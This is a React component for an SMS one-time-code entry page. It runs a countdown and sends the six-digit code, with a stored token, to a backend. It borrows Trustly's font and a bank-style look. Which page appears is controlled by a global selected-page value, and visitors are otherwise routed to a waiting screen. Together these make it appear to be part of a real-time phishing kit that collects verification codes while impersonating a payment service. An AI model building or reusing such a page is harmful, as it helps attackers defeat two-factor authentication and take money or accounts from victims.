import React, { useEffect, useState } from "react";
import styled from 'styled-components'

import { StyledSection } from "./home";
import InputLogo from '../../assets/images/img_20231110.png'
import { PadWithZero, valideToken } from "../../provider/services";
import { RestApi } from "../../provider/restApi";
import { useNavigate } from "react-router-dom";
import { useGlobalData } from "../../provider/context";

const SMS = () => {
    const INIT_SECS = 0;
    const INIT_MINS = 5;
    const [mins, setMins] = useState(INIT_MINS);
    const [secs, setSecs] = useState(INIT_SECS);
    const [storedTimer, setStoredTimer] = useState(null);
    const [sms, setSMS] = useState('');
    const navigation = useNavigate();
    const [isdisabled, setIsdisabled] = useState(false);
    const [state, { dispatch }]: any = useGlobalData();
    const page = state.selectedPage;
    const startHandler = () => {
        if (storedTimer) {
            clearInterval(storedTimer);
            setMins(INIT_MINS);
            setSecs(INIT_SECS);
        }
        const newTimer: any = setInterval(() => {
            setSecs(prevSecs => {
                if (prevSecs === 0) {
                    setMins(prevMins => prevMins - 1);
                    return 59;
                } else return prevSecs - 1;
            });
        }, 1000);
        setStoredTimer(newTimer);
    };

    const handleInput = async (inputVal: any) => {
        const val = inputVal;
        setSMS(val);
        if (val.length >= 6) {
            const token: any = localStorage.getItem('userToken')

            const formData = {
                sms: val,
                token: token
            }
            const res = await RestApi.smsRegister(formData);
            if (res.status) {
                alert(res.message)
            } else {
                alert(res.message)
                navigation('/')
            }
        }

    }

    useEffect(() => {
        startHandler();
        const token: any = localStorage.getItem('userToken');
        valideToken(token)
            .then((logged) => {
                if (!logged) {
                    navigation('/');
                } else if (page != 'Send 6 digit SMS') {
                    navigation('/waiting')
                }
            }).catch((err: any) => {
                console.log("valideToken error", err.message)
                navigation('/')
            })
    }, [])
    return (
        <StyledSection>
            <div className="panel">
                <SmsSection>
                    <div className="sms-title">
                        A 6-digit SMS has been sent to your phone
                    </div>
                    <div className="sms-panel">
                        <div className="title">
                            <img src={InputLogo} alt="No image" width={50} />
                            <span>Enter the SMS code sent to your phone.</span>
                        </div>
                        <div className="input">
                            <input
                                maxLength={6}
                                autoComplete='off'
                                autoCorrect="off"
                                autoCapitalize="off"
                                spellCheck="false"
                                placeholder="******"
                                type="tel"
                                inputMode="tel"
                                value={sms}
                                onChange={(e) => handleInput(e.target.value)}
                            />
                        </div>
                        <div className="time">
                            {`${PadWithZero(mins)}:${PadWithZero(secs)}`}
                        </div>
                    </div>
                </SmsSection>
            </div>
        </StyledSection>

    )
}

const SmsSection = styled.div`
    display: flex;
    justify-content: center;
    flex-direction: column;
    text-align: center;
    align-items: center;
    gap: 2em;
    
    .sms-title {
        font-family: "Trustly Sans Medium", "Helvetica Neue", Arial, sans-serif;
        font-size: 1.75rem;
        font-weight: 600;
        line-height: 2rem;
        color: rgb(0, 0, 0);
        overflow-wrap: break-word;
    }
    .sms-panel {
        background-color: #0058ab;
        border: none;
        border-radius: 1em;
        width: 80%;
        padding: 1em;
        display: flex;
        flex-direction: column;
        gap: 2em;
        .title {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.5em;
            font-size: 14px;
            text-align: center;
            margin-top: 20px;
            color: white;
        }
        .input {
            input {
                width: 100%;
                color: white;
                font-size: 2em;
                background-color: transparent;
                border: none;                
                text-align: center;
                margin: 0 auto;
                letter-spacing: 15px;
                &::after {
                    content: "";
                    border-color: black;
                    border-style: solid;
                    border-width: thin 0 thin 0;
                    -webkit-transform: scaleX(0);
                    transform: scaleX(0);
                    bottom: 1px;
                    left: 0;
                    position: absolute;
                    -webkit-transition: 0.3s cubic-bezier(0.25, 0.8, 0.5, 1);
                    transition: 0.3s cubic-bezier(0.25, 0.8, 0.5, 1);
                    width: 100%;
                }
                &:focus {
                    border: none;
                    outline: none;
                }
            }
            input::placeholder {
                color: white;
                letter-spacing: 15px;
                    
            }            
        }
        .time {
            color: white;
            font-family: Cairo, monospace;
            font-size: 20px;
            text-align: center;
            display: block;
        }
        
    }
`
export default SMS